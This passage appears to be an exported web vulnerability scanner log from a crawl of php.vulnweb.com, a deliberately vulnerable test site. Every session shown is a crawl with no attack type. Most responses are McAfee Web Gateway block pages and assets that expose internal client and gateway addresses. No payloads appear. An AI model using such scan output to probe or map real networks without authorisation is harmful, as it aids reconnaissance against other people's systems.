	pluginRequest.open ("GET", decodeURIComponent (location.href), true);
	pluginRequest.setRequestHeader ("RequestOTP", "yes");
	pluginRequest.onreadystatechange = function () {
		if (pluginRequest.readyState == 4) {
			document.getElementById ("getOTP").disabled = false;
			var context = pluginRequest.getResponseHeader ("OTPContext");
			if (context) {	
				document.getElementById ("password").disabled = false;
				document.getElementById ("activatebutton").disabled = false;
				document.getElementById ("username").value = context;
			} else { 	
				document.getElementsByTagName("body")[0].innerHTML = pluginRequest.responseText;
			}
		} else {
			setTimeout (abortPluginRequest, 10000);
		}
    };
	pluginRequest.send('');
};

function abortPluginRequest (url, withNewRequest) {
	if (! pluginRequest) {
		alert ("No plugin request");
		return;
	}
        if (pluginRequest.readyState != 4) {
		pluginRequest.abort();
	}
}

function break_line(lineToBreak) {
	if (lineToBreak != '') {
		var len = lineToBreak.length;
		var splitStr = '<wbr />';
		for (var i = 0; i < len;) {
			lineToBreak = lineToBreak.substring(0,i) + splitStr + lineToBreak.substring(i);
			i += 20 + splitStr.length;
			len += splitStr.length;
		}
		lineToBreak = js_encode (lineToBreak);
		lineToBreak = lineToBreak.replace (/&lt;wbr \/&gt;/g, '<wbr />');
		document.write(lineToBreak);
	}
}

function resizeWindow() {
	var x,y;
	if (self.innerHeight) { // all except Explorer
		x = self.innerWidth;
		y = self.innerHeight;
	} else if (document.documentElement && document.documentElement.clientHeight) {
		// Explorer 6 Strict Mode
		x = document.documentElement.clientWidth;
		y = document.documentElement.clientHeight;
	} else if (document.body) {
		// other Explorers
		x = document.body.clientWidth;
		y = document.body.clientHeight;
	}
	if (x < 700 || y < 500) {
		window.resizeTo (700,500);
	}
}

var httpRequest;
var firstRun = 1;

function fixNonHttpURL(paramURL) {
	var url = paramURL;
	var forceRedirect = false;
	if (url.substring(0, 4) !== "http" || url.indexOf("/mwg-internal/") < 0) {
		// Side step Cross-Site protection by client-side redirect to change protocol
		url = document.forms[0].action;
		if (url.substring(0, 4) === "ftp:" || url.substring(0,2) === "//") {
			// replace //domain.com and ftp://domain.com, but not file://folder
			url = url.replace(/^(ftp:)?\/\//g, 'http://');
			console.log("MWG-Progress-Page correcting URL from "+document.location+" to form-action URL "+document.forms[0].action+" with http: "+url);
		} else {
			console.log("MWG-Progress-Page correcting URL from "+document.location+" to form-action: "+url);
		}
		forceRedirect = true;
	}
	return { forceRedirect: forceRedirect, url: url };
};

function makeRequest() {
	if (typeof XMLHttpRequest != 'undefined') {
		window.httpRequest = new XMLHttpRequest();
	}
	if (!window.httpRequest) {
		try {
			window.httpRequest  = new ActiveXObject("Msxml2.XMLHTTP");
		} catch(e) {
			try {
				window.httpRequest  = new ActiveXObject("Microsoft.XMLHTTP");
			} catch(e) {
				window.httpRequest  = null;
			}
		}
	}
	if (window.httpRequest) {
		var correctURL = fixNonHttpURL(document.location + "");
		var url = correctURL.url;
		var forceRedirect = correctURL.forceRedirect;

		// remove querystring
		if (url.indexOf ("?") >=0) {
			url = url.substr (0, url.indexOf ("?"));
		}
		if (forceRedirect) {
			url = url + "?id=" + document.getElementById("progresspageid").content;
			window.location = url;
			return;
		}
		url = url + "?id=" + document.getElementById("progresspageid").content + "&a=1&" + (new Date()).getTime();
		console.log("MWG-Progress-Request URL: "+ url);
		window.httpRequest.open("GET", url, true);
		window.httpRequest.onreadystatechange = getResponse; // Callback Function
		window.httpRequest.send('');
	}
}

var progressBarCount = 20;
var progressBarImageWidth = 15;
var progressBarImageHeight = 20;
var progressBarImageBlue = new Image();
var progressBarImageGrey = new Image();
var timerId = null;

function getResponse()
{
	if (window.httpRequest.readyState == 4 && window.httpRequest.status == 200) {
		var resRaw = window.httpRequest.responseText;
		/** Need 4-values separated by ";": downloaded_size ; download_total_size|? ; progess_in_100_percent|40 for unknown size ; 0|1=download_ready ; 0=not_scanning|scantime_in_secs */
		if (window.httpRequest.responseText.length >= 500 || !resRaw.match(/[^;]{0,20};[^;]{0,20};[01];[^;]{0,100}/)) {
			var error = 'Unexpected progress page result (too large?). Stopping to check for "FTP download over HTTP"-progress. See browser console for details.';
			console.log("MWG-Progress page query-failed:\nURL: "+window.httpRequest.responseURL+"\nResponse headers:\n" + window.httpRequest.getAllResponseHeaders() + "\n\nContent:\n" + window.httpRequest.responseText);
			alert(error);
			if (timerId!=null) {
				try {
					window.clearInterval(timerId);
				} catch (ex) {
				}
			}
			throw error;
		}
		var res = resRaw.split(";");
		if (res[3] == 1 || res[3] == undefined) { 
			var correctURL = fixNonHttpURL(document.location + "");
			var url = correctURL.url;
			var forceRedirect = correctURL.forceRedirect;
			if (forceRedirect) {
				window.location = url;
			} else {
				console.log("MWG-Progress-Reload: " + url);
				window.location.reload();
			}
		}
		var text = "";
		if( res[4] == 0) {
			var temp = document.getElementById ('downloadText');
			if (temp) {
				text = temp.content;
				text = text.replace (/[|]a/g, res[0]);
				text = text.replace (/[|]b/g, res[1]);
			} else {
				text = "Downloaded " + res[0] + " of " + res[1];
			}
		} else {
			var temp = document.getElementById ('scanningText');
			if (temp) {
				text = temp.content;
				text = text.replace (/[|]a/g,res[4]);
			} else {
				text = "Scanning in progress (" + res[4] + "s)";
			}
		}
		document.getElementById ("progress").firstChild.nodeValue = text;

		for (i=0; i<progressBarCount; i++) {
			var img = document.getElementById (("i" + i));
			if (img != null) {
				if ((res[4] == 0 && res[2] >= (i * 100 / progressBarCount))
					|| (res[4] > 0 && i == Math.round(res[4]/3) % progressBarCount) )
					img.src = window.progressBarImageBlue.src;
				else
					img.src = window.progressBarImageGrey.src;
				img.width = window.progressBarImageWidth;
				img.height = window.progressBarImageHeight;
			}
		}
		var timeElem = document.getElementById ("time");
		if (timeElem) {
			var now = new Date();
			timeElem.firstChild.nodeValue = now;
		}
		if (window.firstRun == 1 ) { timerId = window.setInterval("makeRequest()", 3000); window.firstRun = 0;}
	}
}

function printProgressBar(imgCount,imgDone,img,width,height)
{
	window.progressBarCount = imgCount;
	window.progressBarImageWidth = width;
	window.progressBarImageHeight = height;
	window.progressBarImageBlue.src = imgDone;
	window.progressBarImageGrey.src = img;
	
	for (i=0; i<imgCount; i++) {
		document.write ('<img id ="i' + i + '" src="' + img + '" height="' + height + '" width="' + width + '">\n');
	}		
}
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.0 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>application/x-javascript</Value></Header><Header><Name>Cache-Control</Name><Value>Max-age=86400</Value></Header><Header><Name>Content-Length</Name><Value>13629</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="7806BC48DD2382C18CA66EAAD61F64A3"><URL>http://php.vulnweb.com:80/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="7806BC48DD2382C18CA66EAAD61F64A3"><![CDATA[GET /mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css HTTP/1.1
Referer: http://php.vulnweb.com/pictures/1.jpg.tn
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="7806BC48DD2382C18CA66EAAD61F64A3";PSID="210657288A91100C4123A79F42F2ACAF";SessionType="Crawl";CrawlType="ScriptInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="96";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="30eceae0";
X-Request-Memo: ID="7bdb4122";sc="1";tid="96";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.0 200 OK
Via: 1.0 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Connection: keep-alive
Content-Type: text/css
Cache-Control: Max-age=86400
Content-Length: 3746

/* general purpose styles */
html {
    height: 100%;
}
div {
    clear: both;
}

body
{
    background-color: #ced1d4;
    font-family: verdana, helvetica, arial, sans-serif;
    font-size: 16px;
    margin: 0px;
    padding: 4%;
}

table
{
    border: 0px none Black;
    border-collapse: collapse;
    margin: 0px;
    padding: 0px;
    table-layout: fixed;
    width: 1000px;
    height: 100px;
}

td
{
    margin: 0px;
    padding: 0px;
}

a
{
    color: #800000;
    text-decoration: none;
}
a:hover
{
    text-decoration: underline;
}

b
{
    color: #800000;
    font-weight: bold;
}

hr
{
    border: 1px solid #800000;
}

img
{
    border: 0px none #800000;
}

wbr
{
    display: inline-block;
}

/* body table-Container for all content */
.bodyTable
{
    margin: 0px auto;
    overflow: hidden;
}
.bodyData
{
    background-repeat: no-repeat;
    border: 0px none Silver;
}

.content {
    margin: auto;
    background-color: white;
    background-repeat: repeat-x;
    background-attachment: scroll;
    background-clip: border-box;
    background-origin: padding-box;
    background-size: auto auto;
    color: black;
    padding: 5px;
}

/* logoTable styles */
.logoTable
{
    height: 60px;
}
.logoData
{ padding: 0px 0px 0px 10px; }

/* Title table styles */
.titleTable
{
    height: 32px;
}
.titleData
{
    color: White;
    font-size: 19px;
    font-weight: bold;
    padding: 9px 10px;
    text-align: center;
}

/* blockDescTable styles */
.contentTable
{ }
.contentData
{
    padding: 5px 10px;
}

/* infoTable styles */
.infoTable
{ }
.infoData
{
    height: 14px;
    padding: 0px 15px;
}

.confirmData {
    height: 14px;
    padding: 0px 15px;
    width: 450px;
}

.formData {
    margin: 0px;
    padding: 0px 15px;
    table-layout: auto;
    text-align: left;
} 

.textfield {
    width: 200px;
} 

.button {
    color: #800000;
    font: bold small verdana, helvetica, arial, sans-serif;
    font-size: 16px;
    text-align: center;
    width: 475px;
} 
.loginbutton {
    color: #800000;
    font: bold small verdana, helvetica, arial, sans-serif;
    font-size: 16px;
    text-align: center;
    width: 155px;
} 

/* optionsTable styles */
.optionsTable
{ }
.optionsData
{
    height: 12px;
    padding: 0px 15px;
}

/* policyTable styles */
.policyTable
{ }
.policyHeading
{
    color: #800000;
    font-size: 12px;
    font-weight: bold;
    text-align: center;
}
.policyData
{
    color: Black;
    font-size: 12px;
    padding: 5px 15px;
    text-align: justify;
}

/* cACertTable styles */
.cACertTable
{ }
.cACertData
{
    padding: 5px 15px;
    text-align: right;
}

/* actionTable styles */
.actionTable
{ }
.actionData
{
    padding: 5px 10px;
}
.actionTitle
{
    color: #800000;
    font-size: 14px;
    font-weight: bold;
}

/* footTable styles */
.footTable
{ }
.footData
{
    color: Gray;
    font-size: 9px;
    font-style: italic;
    padding: 2px;
    text-align: right;
}

/* style for the helpdesk information text */
.helpDeskData
{
    color: White;
    font-size: 14px;
    font-weight: bold;
    padding: 9px 10px;
    text-align: center;
}

/* for proxy errors (FailureDescription) */
.proxyErrorData
{
    color: Gray;
    font-size: 9px;
    padding: 10px 0px 0px 0px;
}

/* .nodisplay used to supress blank,empty (-),false or 0 fields */

.nodisplay {
    display: none;
}

.nodisplay- {
    display: none;
}

.nodisplay0 {
    display: none;
}

.nodisplayfalse {
    display: none;
}
.nodisplayfalsefalse {
    display: none;
}
.nodisplayfalsefalsefalse {
    display: none;
}

.notdisplaytrue {
    display: none;
}

.nodisplay0\.0\.0\.0 {
    display: none;
}

.nodisplay255\.255\.255\.255 {
    display: none;
}

.nodisplay0\:0\:0\:0\:0\:0\:0\:0 {
    display: none;
}

/*EOF*/

]]></RawResponse><Request id="7806BC48DD2382C18CA66EAAD61F64A3"><Method>GET</Method><Path>/mwg-internal/de5fs23hu73ds/files/SerproSchema/</Path><File>stylesheet</File><Ext>css</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/1.jpg.tn</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="7806BC48DD2382C18CA66EAAD61F64A3";PSID="210657288A91100C4123A79F42F2ACAF";SessionType="Crawl";CrawlType="ScriptInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="96";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="30eceae0";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="7bdb4122";sc="1";tid="96";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.0</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[/* general purpose styles */
html {
    height: 100%;
}
div {
    clear: both;
}

body
{
    background-color: #ced1d4;
    font-family: verdana, helvetica, arial, sans-serif;
    font-size: 16px;
    margin: 0px;
    padding: 4%;
}

table
{
    border: 0px none Black;
    border-collapse: collapse;
    margin: 0px;
    padding: 0px;
    table-layout: fixed;
    width: 1000px;
    height: 100px;
}

td
{
    margin: 0px;
    padding: 0px;
}

a
{
    color: #800000;
    text-decoration: none;
}
a:hover
{
    text-decoration: underline;
}

b
{
    color: #800000;
    font-weight: bold;
}

hr
{
    border: 1px solid #800000;
}

img
{
    border: 0px none #800000;
}

wbr
{
    display: inline-block;
}

/* body table-Container for all content */
.bodyTable
{
    margin: 0px auto;
    overflow: hidden;
}
.bodyData
{
    background-repeat: no-repeat;
    border: 0px none Silver;
}

.content {
    margin: auto;
    background-color: white;
    background-repeat: repeat-x;
    background-attachment: scroll;
    background-clip: border-box;
    background-origin: padding-box;
    background-size: auto auto;
    color: black;
    padding: 5px;
}

/* logoTable styles */
.logoTable
{
    height: 60px;
}
.logoData
{ padding: 0px 0px 0px 10px; }

/* Title table styles */
.titleTable
{
    height: 32px;
}
.titleData
{
    color: White;
    font-size: 19px;
    font-weight: bold;
    padding: 9px 10px;
    text-align: center;
}

/* blockDescTable styles */
.contentTable
{ }
.contentData
{
    padding: 5px 10px;
}

/* infoTable styles */
.infoTable
{ }
.infoData
{
    height: 14px;
    padding: 0px 15px;
}

.confirmData {
    height: 14px;
    padding: 0px 15px;
    width: 450px;
}

.formData {
    margin: 0px;
    padding: 0px 15px;
    table-layout: auto;
    text-align: left;
} 

.textfield {
    width: 200px;
} 

.button {
    color: #800000;
    font: bold small verdana, helvetica, arial, sans-serif;
    font-size: 16px;
    text-align: center;
    width: 475px;
} 
.loginbutton {
    color: #800000;
    font: bold small verdana, helvetica, arial, sans-serif;
    font-size: 16px;
    text-align: center;
    width: 155px;
} 

/* optionsTable styles */
.optionsTable
{ }
.optionsData
{
    height: 12px;
    padding: 0px 15px;
}

/* policyTable styles */
.policyTable
{ }
.policyHeading
{
    color: #800000;
    font-size: 12px;
    font-weight: bold;
    text-align: center;
}
.policyData
{
    color: Black;
    font-size: 12px;
    padding: 5px 15px;
    text-align: justify;
}

/* cACertTable styles */
.cACertTable
{ }
.cACertData
{
    padding: 5px 15px;
    text-align: right;
}

/* actionTable styles */
.actionTable
{ }
.actionData
{
    padding: 5px 10px;
}
.actionTitle
{
    color: #800000;
    font-size: 14px;
    font-weight: bold;
}

/* footTable styles */
.footTable
{ }
.footData
{
    color: Gray;
    font-size: 9px;
    font-style: italic;
    padding: 2px;
    text-align: right;
}

/* style for the helpdesk information text */
.helpDeskData
{
    color: White;
    font-size: 14px;
    font-weight: bold;
    padding: 9px 10px;
    text-align: center;
}

/* for proxy errors (FailureDescription) */
.proxyErrorData
{
    color: Gray;
    font-size: 9px;
    padding: 10px 0px 0px 0px;
}

/* .nodisplay used to supress blank,empty (-),false or 0 fields */

.nodisplay {
    display: none;
}

.nodisplay- {
    display: none;
}

.nodisplay0 {
    display: none;
}

.nodisplayfalse {
    display: none;
}
.nodisplayfalsefalse {
    display: none;
}
.nodisplayfalsefalsefalse {
    display: none;
}

.notdisplaytrue {
    display: none;
}

.nodisplay0\.0\.0\.0 {
    display: none;
}

.nodisplay255\.255\.255\.255 {
    display: none;
}

.nodisplay0\:0\:0\:0\:0\:0\:0\:0 {
    display: none;
}

/*EOF*/

]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.0 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/css</Value></Header><Header><Name>Cache-Control</Name><Value>Max-age=86400</Value></Header><Header><Name>Content-Length</Name><Value>3746</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="B219613770D223B9C34337D7F6EBA383"><URL>http://php.vulnweb.com:80/pictures/6.jpg.tn</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="B219613770D223B9C34337D7F6EBA383"><![CDATA[GET /pictures/6.jpg.tn HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="B219613770D223B9C34337D7F6EBA383";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="65c3299b";
X-Request-Memo: ID="d3adb314";sc="1";tid="35";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 403 URLBlocked-Serpro
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Connection: keep-alive
Content-Type: text/html
Cache-Control: no-cache
Content-Length: 3659
X-Frame-Options: deny

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/6.jpg.tn");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:49:11</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></RawResponse><Request id="B219613770D223B9C34337D7F6EBA383"><Method>GET</Method><Path>/pictures/</Path><File>6.jpg</File><Ext>tn</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="B219613770D223B9C34337D7F6EBA383";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="65c3299b";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="d3adb314";sc="1";tid="35";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>403</StatusCode><StatusDescription>URLBlocked-Serpro</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/6.jpg.tn");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:49:11</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Cache-Control</Name><Value>no-cache</Value></Header><Header><Name>Content-Length</Name><Value>3659</Value></Header><Header><Name>X-Frame-Options</Name><Value>deny</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="E7330A41CFCDCC9DCB4118D50B7E9B45"><URL>http://php.vulnweb.com:80/pictures/7.jpg.tn</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="E7330A41CFCDCC9DCB4118D50B7E9B45"><![CDATA[GET /pictures/7.jpg.tn HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="E7330A41CFCDCC9DCB4118D50B7E9B45";PSID="EC54310C1F88F6659328976C3D636498";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="105";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="c0eddd15";
X-Request-Memo: ID="9c3f4374";sc="1";tid="36";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 403 URLBlocked-Serpro
